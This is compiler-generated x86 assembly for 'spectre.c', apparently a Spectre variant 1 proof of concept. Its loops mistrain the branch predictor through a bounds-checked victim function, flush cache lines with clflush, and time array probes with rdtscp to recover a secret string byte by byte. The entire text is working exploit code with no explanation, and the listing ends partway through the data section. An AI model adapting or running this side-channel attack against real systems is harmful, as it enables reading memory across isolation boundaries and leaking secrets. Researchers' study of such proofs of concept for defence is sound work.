	.text
	.file	"spectre.c"
	.globl	check                           # -- Begin function check
	.p2align	4, 0x90
	.type	check,@function
check:                                  # @check
	.cfi_startproc
# %bb.0:
	xorl	%eax, %eax
	cmpl	$16, 4(%esp)
	setb	%al
	retl
.Lfunc_end0:
	.size	check, .Lfunc_end0-check
	.cfi_endproc
                                        # -- End function
	.globl	victim_function                 # -- Begin function victim_function
	.p2align	4, 0x90
	.type	victim_function,@function
victim_function:                        # @victim_function
	.cfi_startproc
# %bb.0:
	calll	.L1$pb
	.cfi_adjust_cfa_offset 4
.L1$pb:
	popl	%eax
	.cfi_adjust_cfa_offset -4
.Ltmp0:
	addl	$_GLOBAL_OFFSET_TABLE_+(.Ltmp0-.L1$pb), %eax
	movl	4(%esp), %ecx
	movl	last_x@GOTOFF(%eax), %edx
	cmpl	%ecx, %edx
	je	.LBB1_1
# %bb.2:
	cmpl	$15, %ecx
	jbe	.LBB1_3
.LBB1_4:
	retl
.LBB1_1:
	movzbl	array1@GOTOFF(%eax,%ecx), %edx
	shll	$9, %edx
	movb	array2@GOTOFF(%eax,%edx), %dl
	andb	%dl, temp@GOTOFF(%eax)
	cmpl	$15, %ecx
	ja	.LBB1_4
.LBB1_3:
	movl	%ecx, last_x@GOTOFF(%eax)
	retl
.Lfunc_end1:
	.size	victim_function, .Lfunc_end1-victim_function
	.cfi_endproc
                                        # -- End function
	.globl	readMemoryByte                  # -- Begin function readMemoryByte
	.p2align	4, 0x90
	.type	readMemoryByte,@function
readMemoryByte:                         # @readMemoryByte
	.cfi_startproc
# %bb.0:
	pushl	%ebp
	.cfi_def_cfa_offset 8
	pushl	%ebx
	.cfi_def_cfa_offset 12
	pushl	%edi
	.cfi_def_cfa_offset 16
	pushl	%esi
	.cfi_def_cfa_offset 20
	subl	$28, %esp
	.cfi_def_cfa_offset 48
	.cfi_offset %esi, -20
	.cfi_offset %edi, -16
	.cfi_offset %ebx, -12
	.cfi_offset %ebp, -8
	calll	.L2$pb
	.cfi_adjust_cfa_offset 4
.L2$pb:
	popl	%ebx
	.cfi_adjust_cfa_offset -4
.Ltmp1:
	addl	$_GLOBAL_OFFSET_TABLE_+(.Ltmp1-.L2$pb), %ebx
	movl	48(%esp), %esi
	subl	$4, %esp
	.cfi_adjust_cfa_offset 4
	leal	readMemoryByte.results@GOTOFF(%ebx), %eax
	pushl	$1024                           # imm = 0x400
	.cfi_adjust_cfa_offset 4
	pushl	$0
	.cfi_adjust_cfa_offset 4
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	calll	memset@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	xorl	$3, %esi
	movl	%esi, 12(%esp)                  # 4-byte Spill
	movl	$999, %ebp                      # imm = 0x3E7
	.p2align	4, 0x90
.LBB2_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB2_2 Depth 2
                                        #     Child Loop BB2_4 Depth 2
                                        #       Child Loop BB2_29 Depth 3
                                        #     Child Loop BB2_7 Depth 2
                                        #     Child Loop BB2_12 Depth 2
	xorl	%eax, %eax
	.p2align	4, 0x90
.LBB2_2:                                #   Parent Loop BB2_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	clflush	array2@GOTOFF(%ebx,%eax)
	clflush	array2@GOTOFF+512(%ebx,%eax)
	clflush	array2@GOTOFF+1024(%ebx,%eax)
	clflush	array2@GOTOFF+1536(%ebx,%eax)
	clflush	array2@GOTOFF+2048(%ebx,%eax)
	clflush	array2@GOTOFF+2560(%ebx,%eax)
	clflush	array2@GOTOFF+3072(%ebx,%eax)
	clflush	array2@GOTOFF+3584(%ebx,%eax)
	addl	$4096, %eax                     # imm = 0x1000
	cmpl	$131072, %eax                   # imm = 0x20000
	jne	.LBB2_2
# %bb.3:                                #   in Loop: Header=BB2_1 Depth=1
	movl	$29, %esi
	movl	12(%esp), %edi                  # 4-byte Reload
	jmp	.LBB2_4
	.p2align	4, 0x90
.LBB2_5:                                #   in Loop: Header=BB2_4 Depth=2
	movl	%esi, %eax
	movl	$-1431655765, %ecx              # imm = 0xAAAAAAAB
	mull	%ecx
	shrl	%edx
	andl	$-2, %edx
	leal	(%edx,%edx,2), %eax
	notl	%eax
	addl	%esi, %eax
	movl	%eax, %ecx
	andl	$-65536, %ecx                   # imm = 0xFFFF0000
	shrl	$16, %eax
	orl	%ecx, %eax
	andl	%edi, %eax
	xorl	$3, %eax
	subl	$12, %esp
	.cfi_adjust_cfa_offset 12
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	calll	victim_function
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	subl	$1, %esi
	jb	.LBB2_6
.LBB2_4:                                #   Parent Loop BB2_1 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB2_29 Depth 3
	clflush	last_x@GOTOFF(%ebx)
	movl	$0, 8(%esp)
	movl	8(%esp), %eax
	cmpl	$99, %eax
	jg	.LBB2_5
	.p2align	4, 0x90
.LBB2_29:                               #   Parent Loop BB2_1 Depth=1
                                        #     Parent Loop BB2_4 Depth=2
                                        # =>    This Inner Loop Header: Depth=3
	addl	$1, 8(%esp)
	movl	8(%esp), %eax
	cmpl	$100, %eax
	jl	.LBB2_29
	jmp	.LBB2_5
	.p2align	4, 0x90
.LBB2_6:                                #   in Loop: Header=BB2_1 Depth=1
	movl	%ebp, 16(%esp)                  # 4-byte Spill
	andl	$15, %ebp
	movl	%ebp, 20(%esp)                  # 4-byte Spill
	movl	$13, %ecx
	jmp	.LBB2_7
	.p2align	4, 0x90
.LBB2_10:                               #   in Loop: Header=BB2_7 Depth=2
	addl	$167, %ecx
	cmpl	$42765, %ecx                    # imm = 0xA70D
	je	.LBB2_11
.LBB2_7:                                #   Parent Loop BB2_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	movl	%ecx, 4(%esp)                   # 4-byte Spill
	movzbl	%cl, %ebp
	movl	%ebp, %eax
	movl	%ebp, 24(%esp)                  # 4-byte Spill
	shll	$9, %ebp
	rdtscp
	movl	%eax, %esi
	movl	%edx, %edi
	movzbl	array2@GOTOFF(%ebx,%ebp), %eax
	rdtscp
	movl	%ecx, %ebp
	subl	%esi, %eax
	sbbl	%edi, %edx
	movl	$100, %ecx
	cmpl	%eax, %ecx
	movl	4(%esp), %ecx                   # 4-byte Reload
	movl	$0, %eax
	sbbl	%edx, %eax
	jb	.LBB2_10
# %bb.8:                                #   in Loop: Header=BB2_7 Depth=2
	movl	20(%esp), %eax                  # 4-byte Reload
	cmpb	array1@GOTOFF(%ebx,%eax), %cl
	je	.LBB2_10
# %bb.9:                                #   in Loop: Header=BB2_7 Depth=2
	movl	24(%esp), %eax                  # 4-byte Reload
	addl	$1, readMemoryByte.results@GOTOFF(%ebx,%eax,4)
	jmp	.LBB2_10
	.p2align	4, 0x90
.LBB2_11:                               #   in Loop: Header=BB2_1 Depth=1
	movl	%ebp, 4(%esp)                   # 4-byte Spill
	movl	$-1, %eax
	xorl	%esi, %esi
	leal	readMemoryByte.results@GOTOFF+4(%ebx), %edi
	movl	$-1, %ecx
	jmp	.LBB2_12
	.p2align	4, 0x90
.LBB2_19:                               #   in Loop: Header=BB2_12 Depth=2
	movl	%eax, %ecx
	movl	%ebp, %eax
.LBB2_24:                               #   in Loop: Header=BB2_12 Depth=2
	addl	$2, %esi
	addl	$8, %edi
	cmpl	$256, %esi                      # imm = 0x100
	je	.LBB2_25
.LBB2_12:                               #   Parent Loop BB2_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	testl	%eax, %eax
	js	.LBB2_13
# %bb.14:                               #   in Loop: Header=BB2_12 Depth=2
	movl	-4(%edi), %edx
	cmpl	readMemoryByte.results@GOTOFF(%ebx,%eax,4), %edx
	jge	.LBB2_13
# %bb.15:                               #   in Loop: Header=BB2_12 Depth=2
	testl	%ecx, %ecx
	js	.LBB2_17
# %bb.16:                               #   in Loop: Header=BB2_12 Depth=2
	cmpl	readMemoryByte.results@GOTOFF(%ebx,%ecx,4), %edx
	jl	.LBB2_18
.LBB2_17:                               #   in Loop: Header=BB2_12 Depth=2
	movl	%esi, %ecx
.LBB2_18:                               #   in Loop: Header=BB2_12 Depth=2
	leal	1(%esi), %ebp
	testl	%eax, %eax
	jns	.LBB2_20
	jmp	.LBB2_19
	.p2align	4, 0x90
.LBB2_13:                               #   in Loop: Header=BB2_12 Depth=2
	movl	%eax, %ecx
	movl	%esi, %eax
	leal	1(%esi), %ebp
	testl	%eax, %eax
	js	.LBB2_19
.LBB2_20:                               #   in Loop: Header=BB2_12 Depth=2
	movl	(%edi), %edx
	cmpl	readMemoryByte.results@GOTOFF(%ebx,%eax,4), %edx
	jge	.LBB2_19
# %bb.21:                               #   in Loop: Header=BB2_12 Depth=2
	testl	%ecx, %ecx
	js	.LBB2_23
# %bb.22:                               #   in Loop: Header=BB2_12 Depth=2
	cmpl	readMemoryByte.results@GOTOFF(%ebx,%ecx,4), %edx
	jl	.LBB2_24
.LBB2_23:                               #   in Loop: Header=BB2_12 Depth=2
	movl	%ebp, %ecx
	jmp	.LBB2_24
	.p2align	4, 0x90
.LBB2_25:                               #   in Loop: Header=BB2_1 Depth=1
	movl	readMemoryByte.results@GOTOFF(%ebx,%eax,4), %esi
	movl	readMemoryByte.results@GOTOFF(%ebx,%ecx,4), %edi
	leal	(%edi,%edi), %edx
	addl	$5, %edx
	cmpl	%edx, %esi
	movl	16(%esp), %ebp                  # 4-byte Reload
	jge	.LBB2_28
# %bb.26:                               #   in Loop: Header=BB2_1 Depth=1
	xorl	$2, %esi
	orl	%edi, %esi
	je	.LBB2_28
# %bb.27:                               #   in Loop: Header=BB2_1 Depth=1
	leal	-1(%ebp), %edx
	cmpl	$1, %ebp
	movl	%edx, %ebp
	ja	.LBB2_1
.LBB2_28:
	movl	4(%esp), %edx                   # 4-byte Reload
	xorl	%edx, readMemoryByte.results@GOTOFF(%ebx)
	movl	52(%esp), %esi
	movb	%al, (%esi)
	movl	readMemoryByte.results@GOTOFF(%ebx,%eax,4), %eax
	movl	56(%esp), %edx
	movl	%eax, (%edx)
	movb	%cl, 1(%esi)
	movl	readMemoryByte.results@GOTOFF(%ebx,%ecx,4), %eax
	movl	%eax, 4(%edx)
	addl	$28, %esp
	.cfi_def_cfa_offset 20
	popl	%esi
	.cfi_def_cfa_offset 16
	popl	%edi
	.cfi_def_cfa_offset 12
	popl	%ebx
	.cfi_def_cfa_offset 8
	popl	%ebp
	.cfi_def_cfa_offset 4
	retl
.Lfunc_end2:
	.size	readMemoryByte, .Lfunc_end2-readMemoryByte
	.cfi_endproc
                                        # -- End function
	.globl	main                            # -- Begin function main
	.p2align	4, 0x90
	.type	main,@function
main:                                   # @main
	.cfi_startproc
# %bb.0:
	pushl	%ebp
	.cfi_def_cfa_offset 8
	pushl	%ebx
	.cfi_def_cfa_offset 12
	pushl	%edi
	.cfi_def_cfa_offset 16
	pushl	%esi
	.cfi_def_cfa_offset 20
	subl	$76, %esp
	.cfi_def_cfa_offset 96
	.cfi_offset %esi, -20
	.cfi_offset %edi, -16
	.cfi_offset %ebx, -12
	.cfi_offset %ebp, -8
	calll	.L3$pb
	.cfi_adjust_cfa_offset 4
.L3$pb:
	popl	%ebx
	.cfi_adjust_cfa_offset -4
.Ltmp2:
	addl	$_GLOBAL_OFFSET_TABLE_+(.Ltmp2-.L3$pb), %ebx
	movl	stdin@GOT(%ebx), %esi
	leal	check@GOTOFF(%ebx), %eax
	movl	%eax, 52(%esp)                  # 4-byte Spill
	leal	.L.str.13@GOTOFF(%ebx), %eax
	movl	%eax, 48(%esp)                  # 4-byte Spill
	leal	.L.str.1@GOTOFF(%ebx), %eax
	movl	%eax, 44(%esp)                  # 4-byte Spill
	leal	array1@GOTOFF(%ebx), %eax
	movl	%eax, 32(%esp)                  # 4-byte Spill
	leal	array2@GOTOFF(%ebx), %eax
	movl	%eax, 40(%esp)                  # 4-byte Spill
	leal	.L.str.2@GOTOFF(%ebx), %eax
	movl	%eax, 36(%esp)                  # 4-byte Spill
	movl	$-1431655765, %edi              # imm = 0xAAAAAAAB
	movl	%esi, 56(%esp)                  # 4-byte Spill
	jmp	.LBB3_1
	.p2align	4, 0x90
.LBB3_40:                               #   in Loop: Header=BB3_1 Depth=1
	calll	getpid@PLT
	xorl	%ecx, %ecx
	movl	52(%esp), %edx                  # 4-byte Reload
	addl	$33, %edx
	setb	%cl
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	pushl	%ecx
	.cfi_adjust_cfa_offset 4
	pushl	%edx
	.cfi_adjust_cfa_offset 4
	pushl	60(%esp)                        # 4-byte Folded Reload
	.cfi_adjust_cfa_offset 4
	calll	printf@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
.LBB3_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB3_8 Depth 2
                                        #       Child Loop BB3_9 Depth 3
                                        #         Child Loop BB3_10 Depth 4
                                        #         Child Loop BB3_12 Depth 4
                                        #           Child Loop BB3_42 Depth 5
                                        #         Child Loop BB3_15 Depth 4
                                        #         Child Loop BB3_20 Depth 4
	subl	$12, %esp
	.cfi_adjust_cfa_offset 12
	pushl	(%esi)
	.cfi_adjust_cfa_offset 4
	calll	getc@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	shll	$24, %eax
	cmpl	$167772160, %eax                # imm = 0xA000000
	je	.LBB3_1
# %bb.2:                                #   in Loop: Header=BB3_1 Depth=1
	cmpl	$1761607680, %eax               # imm = 0x69000000
	je	.LBB3_40
# %bb.3:                                #   in Loop: Header=BB3_1 Depth=1
	cmpl	$1912602624, %eax               # imm = 0x72000000
	jne	.LBB3_41
# %bb.4:                                #   in Loop: Header=BB3_1 Depth=1
	movl	secret@GOTOFF(%ebx), %eax
	subl	$4, %esp
	.cfi_adjust_cfa_offset 4
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	pushl	56(%esp)                        # 4-byte Folded Reload
	.cfi_adjust_cfa_offset 4
	calll	printf@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	movl	secret@GOTOFF(%ebx), %eax
	movl	%eax, %ecx
	subl	32(%esp), %ecx                  # 4-byte Folded Reload
	movl	%ecx, 20(%esp)
	subl	$12, %esp
	.cfi_adjust_cfa_offset 12
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	calll	strlen@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	movl	%eax, %esi
	movl	%eax, 16(%esp)
	subl	$4, %esp
	.cfi_adjust_cfa_offset 4
	pushl	$131072                         # imm = 0x20000
	.cfi_adjust_cfa_offset 4
	pushl	$1
	.cfi_adjust_cfa_offset 4
	pushl	52(%esp)                        # 4-byte Folded Reload
	.cfi_adjust_cfa_offset 4
	calll	memset@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	cmpl	$3, 96(%esp)
	jne	.LBB3_6
# %bb.5:                                #   in Loop: Header=BB3_1 Depth=1
	subl	$4, %esp
	.cfi_adjust_cfa_offset 4
	leal	24(%esp), %eax
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	pushl	44(%esp)                        # 4-byte Folded Reload
	.cfi_adjust_cfa_offset 4
	movl	112(%esp), %esi
	pushl	4(%esi)
	.cfi_adjust_cfa_offset 4
	calll	__isoc99_sscanf@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	movl	32(%esp), %eax                  # 4-byte Reload
	subl	%eax, 20(%esp)
	subl	$4, %esp
	.cfi_adjust_cfa_offset 4
	leal	.L.str.3@GOTOFF(%ebx), %eax
	leal	20(%esp), %ecx
	pushl	%ecx
	.cfi_adjust_cfa_offset 4
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	pushl	8(%esi)
	.cfi_adjust_cfa_offset 4
	calll	__isoc99_sscanf@PLT
	addl	$12, %esp
	.cfi_adjust_cfa_offset -12
	leal	.L.str.4@GOTOFF(%ebx), %eax
	pushl	20(%esp)
	.cfi_adjust_cfa_offset 4
	pushl	28(%esp)
	.cfi_adjust_cfa_offset 4
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	calll	printf@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	movl	16(%esp), %esi
.LBB3_6:                                #   in Loop: Header=BB3_1 Depth=1
	subl	$8, %esp
	.cfi_adjust_cfa_offset 8
	leal	.L.str.5@GOTOFF(%ebx), %eax
	pushl	%esi
	.cfi_adjust_cfa_offset 4
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	calll	printf@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	movl	16(%esp), %eax
	leal	-1(%eax), %ecx
	movl	%ecx, 16(%esp)
	testl	%eax, %eax
	jle	.LBB3_39
# %bb.7:                                #   in Loop: Header=BB3_1 Depth=1
	xorl	%esi, %esi
	jmp	.LBB3_8
	.p2align	4, 0x90
.LBB3_38:                               #   in Loop: Header=BB3_8 Depth=2
	subl	$12, %esp
	.cfi_adjust_cfa_offset 12
	pushl	$10
	.cfi_adjust_cfa_offset 4
	calll	putchar@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	movl	16(%esp), %eax
	leal	-1(%eax), %ecx
	movl	%ecx, 16(%esp)
	testl	%eax, %eax
	movl	60(%esp), %esi                  # 4-byte Reload
	jle	.LBB3_39
.LBB3_8:                                #   Parent Loop BB3_1 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB3_9 Depth 3
                                        #         Child Loop BB3_10 Depth 4
                                        #         Child Loop BB3_12 Depth 4
                                        #           Child Loop BB3_42 Depth 5
                                        #         Child Loop BB3_15 Depth 4
                                        #         Child Loop BB3_20 Depth 4
	movl	secret@GOTOFF(%ebx), %eax
	movsbl	(%eax,%esi), %eax
	subl	$4, %esp
	.cfi_adjust_cfa_offset 4
	leal	.L.str.6@GOTOFF(%ebx), %ecx
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	pushl	28(%esp)
	.cfi_adjust_cfa_offset 4
	pushl	%ecx
	.cfi_adjust_cfa_offset 4
	calll	printf@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	addl	$1, %esi
	movl	%esi, 60(%esp)                  # 4-byte Spill
	movl	20(%esp), %esi
	leal	1(%esi), %eax
	movl	%eax, 20(%esp)
	subl	$4, %esp
	.cfi_adjust_cfa_offset 4
	leal	readMemoryByte.results@GOTOFF(%ebx), %eax
	pushl	$1024                           # imm = 0x400
	.cfi_adjust_cfa_offset 4
	pushl	$0
	.cfi_adjust_cfa_offset 4
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	calll	memset@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	xorl	$3, %esi
	movl	%esi, 72(%esp)                  # 4-byte Spill
	movl	$999, %ebp                      # imm = 0x3E7
	.p2align	4, 0x90
.LBB3_9:                                #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        # =>    This Loop Header: Depth=3
                                        #         Child Loop BB3_10 Depth 4
                                        #         Child Loop BB3_12 Depth 4
                                        #           Child Loop BB3_42 Depth 5
                                        #         Child Loop BB3_15 Depth 4
                                        #         Child Loop BB3_20 Depth 4
	xorl	%eax, %eax
	.p2align	4, 0x90
.LBB3_10:                               #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        #       Parent Loop BB3_9 Depth=3
                                        # =>      This Inner Loop Header: Depth=4
	clflush	array2@GOTOFF(%ebx,%eax)
	clflush	array2@GOTOFF+512(%ebx,%eax)
	clflush	array2@GOTOFF+1024(%ebx,%eax)
	clflush	array2@GOTOFF+1536(%ebx,%eax)
	clflush	array2@GOTOFF+2048(%ebx,%eax)
	clflush	array2@GOTOFF+2560(%ebx,%eax)
	clflush	array2@GOTOFF+3072(%ebx,%eax)
	clflush	array2@GOTOFF+3584(%ebx,%eax)
	addl	$4096, %eax                     # imm = 0x1000
	cmpl	$131072, %eax                   # imm = 0x20000
	jne	.LBB3_10
# %bb.11:                               #   in Loop: Header=BB3_9 Depth=3
	movl	$29, %esi
	jmp	.LBB3_12
	.p2align	4, 0x90
.LBB3_13:                               #   in Loop: Header=BB3_12 Depth=4
	movl	%esi, %eax
	mull	%edi
	shrl	%edx
	andl	$-2, %edx
	leal	(%edx,%edx,2), %eax
	notl	%eax
	addl	%esi, %eax
	movl	%eax, %ecx
	andl	$-65536, %ecx                   # imm = 0xFFFF0000
	shrl	$16, %eax
	orl	%ecx, %eax
	andl	72(%esp), %eax                  # 4-byte Folded Reload
	xorl	$3, %eax
	subl	$12, %esp
	.cfi_adjust_cfa_offset 12
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	calll	victim_function
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	subl	$1, %esi
	jb	.LBB3_14
.LBB3_12:                               #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        #       Parent Loop BB3_9 Depth=3
                                        # =>      This Loop Header: Depth=4
                                        #           Child Loop BB3_42 Depth 5
	clflush	last_x@GOTOFF(%ebx)
	movl	$0, 28(%esp)
	movl	28(%esp), %eax
	cmpl	$99, %eax
	jg	.LBB3_13
	.p2align	4, 0x90
.LBB3_42:                               #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        #       Parent Loop BB3_9 Depth=3
                                        #         Parent Loop BB3_12 Depth=4
                                        # =>        This Inner Loop Header: Depth=5
	addl	$1, 28(%esp)
	movl	28(%esp), %eax
	cmpl	$100, %eax
	jl	.LBB3_42
	jmp	.LBB3_13
	.p2align	4, 0x90
.LBB3_14:                               #   in Loop: Header=BB3_9 Depth=3
	movl	%ebp, 64(%esp)                  # 4-byte Spill
	andl	$15, %ebp
	movl	%ebp, 68(%esp)                  # 4-byte Spill
	movl	$13, %edx
	jmp	.LBB3_15
	.p2align	4, 0x90
.LBB3_18:                               #   in Loop: Header=BB3_15 Depth=4
	addl	$167, %edx
	cmpl	$42765, %edx                    # imm = 0xA70D
	je	.LBB3_19
.LBB3_15:                               #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        #       Parent Loop BB3_9 Depth=3
                                        # =>      This Inner Loop Header: Depth=4
	movl	%edx, 12(%esp)                  # 4-byte Spill
	movzbl	%dl, %ebp
	movl	%ebp, %eax
	movl	%ebp, 24(%esp)                  # 4-byte Spill
	shll	$9, %ebp
	rdtscp
	movl	%eax, %esi
	movl	%edx, %edi
	movzbl	array2@GOTOFF(%ebx,%ebp), %eax
	rdtscp
	subl	%esi, %eax
	sbbl	%edi, %edx
	movl	$100, %esi
	cmpl	%eax, %esi
	movl	$0, %eax
	sbbl	%edx, %eax
	movl	12(%esp), %edx                  # 4-byte Reload
	jb	.LBB3_18
# %bb.16:                               #   in Loop: Header=BB3_15 Depth=4
	movl	68(%esp), %eax                  # 4-byte Reload
	cmpb	array1@GOTOFF(%ebx,%eax), %dl
	je	.LBB3_18
# %bb.17:                               #   in Loop: Header=BB3_15 Depth=4
	movl	24(%esp), %eax                  # 4-byte Reload
	addl	$1, readMemoryByte.results@GOTOFF(%ebx,%eax,4)
	jmp	.LBB3_18
	.p2align	4, 0x90
.LBB3_19:                               #   in Loop: Header=BB3_9 Depth=3
	movl	%ecx, 24(%esp)                  # 4-byte Spill
	movl	$-1, %ecx
	xorl	%eax, %eax
	leal	readMemoryByte.results@GOTOFF+4(%ebx), %edx
	movl	$-1, 12(%esp)                   # 4-byte Folded Spill
	jmp	.LBB3_20
	.p2align	4, 0x90
.LBB3_27:                               #   in Loop: Header=BB3_20 Depth=4
	movl	%ecx, 12(%esp)                  # 4-byte Spill
	movl	%esi, %ecx
.LBB3_32:                               #   in Loop: Header=BB3_20 Depth=4
	addl	$2, %eax
	addl	$8, %edx
	cmpl	$256, %eax                      # imm = 0x100
	je	.LBB3_33
.LBB3_20:                               #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        #       Parent Loop BB3_9 Depth=3
                                        # =>      This Inner Loop Header: Depth=4
	movl	%ecx, %edi
	testl	%ecx, %ecx
	js	.LBB3_21
# %bb.22:                               #   in Loop: Header=BB3_20 Depth=4
	movl	-4(%edx), %esi
	cmpl	readMemoryByte.results@GOTOFF(%ebx,%edi,4), %esi
	jge	.LBB3_21
# %bb.23:                               #   in Loop: Header=BB3_20 Depth=4
	movl	12(%esp), %edi                  # 4-byte Reload
	testl	%edi, %edi
	js	.LBB3_25
# %bb.24:                               #   in Loop: Header=BB3_20 Depth=4
	cmpl	readMemoryByte.results@GOTOFF(%ebx,%edi,4), %esi
	jl	.LBB3_26
.LBB3_25:                               #   in Loop: Header=BB3_20 Depth=4
	movl	%eax, 12(%esp)                  # 4-byte Spill
.LBB3_26:                               #   in Loop: Header=BB3_20 Depth=4
	leal	1(%eax), %esi
	testl	%ecx, %ecx
	jns	.LBB3_28
	jmp	.LBB3_27
	.p2align	4, 0x90
.LBB3_21:                               #   in Loop: Header=BB3_20 Depth=4
	movl	%edi, 12(%esp)                  # 4-byte Spill
	movl	%eax, %ecx
	leal	1(%eax), %esi
	testl	%ecx, %ecx
	js	.LBB3_27
.LBB3_28:                               #   in Loop: Header=BB3_20 Depth=4
	movl	(%edx), %edi
	cmpl	readMemoryByte.results@GOTOFF(%ebx,%ecx,4), %edi
	jge	.LBB3_27
# %bb.29:                               #   in Loop: Header=BB3_20 Depth=4
	movl	12(%esp), %ebp                  # 4-byte Reload
	testl	%ebp, %ebp
	js	.LBB3_31
# %bb.30:                               #   in Loop: Header=BB3_20 Depth=4
	cmpl	readMemoryByte.results@GOTOFF(%ebx,%ebp,4), %edi
	jl	.LBB3_32
.LBB3_31:                               #   in Loop: Header=BB3_20 Depth=4
	movl	%esi, 12(%esp)                  # 4-byte Spill
	jmp	.LBB3_32
	.p2align	4, 0x90
.LBB3_33:                               #   in Loop: Header=BB3_9 Depth=3
	movl	%ecx, %eax
	movl	readMemoryByte.results@GOTOFF(%ebx,%ecx,4), %eax
	movl	12(%esp), %edx                  # 4-byte Reload
	movl	readMemoryByte.results@GOTOFF(%ebx,%edx,4), %edx
	leal	(%edx,%edx), %esi
	addl	$5, %esi
	cmpl	%esi, %eax
	movl	$-1431655765, %edi              # imm = 0xAAAAAAAB
	movl	64(%esp), %esi                  # 4-byte Reload
	jge	.LBB3_36
# %bb.34:                               #   in Loop: Header=BB3_9 Depth=3
	xorl	$2, %eax
	orl	%edx, %eax
	je	.LBB3_36
# %bb.35:                               #   in Loop: Header=BB3_9 Depth=3
	leal	-1(%esi), %ebp
	cmpl	$1, %esi
	ja	.LBB3_9
.LBB3_36:                               #   in Loop: Header=BB3_8 Depth=2
	movl	24(%esp), %eax                  # 4-byte Reload
	xorl	%eax, readMemoryByte.results@GOTOFF(%ebx)
	movl	%ecx, %ebp
	movl	readMemoryByte.results@GOTOFF(%ebx,%ecx,4), %ecx
	movl	%ecx, 24(%esp)                  # 4-byte Spill
	movl	12(%esp), %eax                  # 4-byte Reload
	movl	readMemoryByte.results@GOTOFF(%ebx,%eax,4), %esi
	leal	(%esi,%esi), %eax
	cmpl	%eax, %ecx
	leal	.L.str.9@GOTOFF(%ebx), %eax
	leal	.L.str.8@GOTOFF(%ebx), %ecx
	cmovll	%eax, %ecx
	subl	$8, %esp
	.cfi_adjust_cfa_offset 8
	leal	.L.str.7@GOTOFF(%ebx), %eax
	pushl	%ecx
	.cfi_adjust_cfa_offset 4
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	calll	printf@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	movl	%ebp, %ecx
	movzbl	%cl, %eax
	addb	$-32, %cl
	cmpb	$95, %cl
	movl	$63, %ecx
	cmovbl	%eax, %ecx
	leal	.L.str.10@GOTOFF(%ebx), %edx
	pushl	24(%esp)                        # 4-byte Folded Reload
	.cfi_adjust_cfa_offset 4
	pushl	%ecx
	.cfi_adjust_cfa_offset 4
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	pushl	%edx
	.cfi_adjust_cfa_offset 4
	calll	printf@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	testl	%esi, %esi
	jle	.LBB3_38
# %bb.37:                               #   in Loop: Header=BB3_8 Depth=2
	movl	12(%esp), %ecx                  # 4-byte Reload
	movzbl	%cl, %eax
	addb	$-32, %cl
	cmpb	$95, %cl
	movl	$63, %ecx
	cmovbl	%eax, %ecx
	leal	.L.str.11@GOTOFF(%ebx), %edx
	pushl	%esi
	.cfi_adjust_cfa_offset 4
	pushl	%ecx
	.cfi_adjust_cfa_offset 4
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	pushl	%edx
	.cfi_adjust_cfa_offset 4
	calll	printf@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	jmp	.LBB3_38
	.p2align	4, 0x90
.LBB3_39:                               #   in Loop: Header=BB3_1 Depth=1
	movl	56(%esp), %esi                  # 4-byte Reload
	jmp	.LBB3_1
.LBB3_41:
	xorl	%eax, %eax
	addl	$76, %esp
	.cfi_def_cfa_offset 20
	popl	%esi
	.cfi_def_cfa_offset 16
	popl	%edi
	.cfi_def_cfa_offset 12
	popl	%ebx
	.cfi_def_cfa_offset 8
	popl	%ebp
	.cfi_def_cfa_offset 4
	retl
.Lfunc_end3:
	.size	main, .Lfunc_end3-main
	.cfi_endproc
                                        # -- End function
	.type	last_x,@object                  # @last_x
	.bss
	.globl	last_x
	.p2align	2
last_x:
	.long	0                               # 0x0
	.size	last_x, 4

	.type	array1,@object                  # @array1
	.data
	.globl	array1
array1:
	.ascii	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
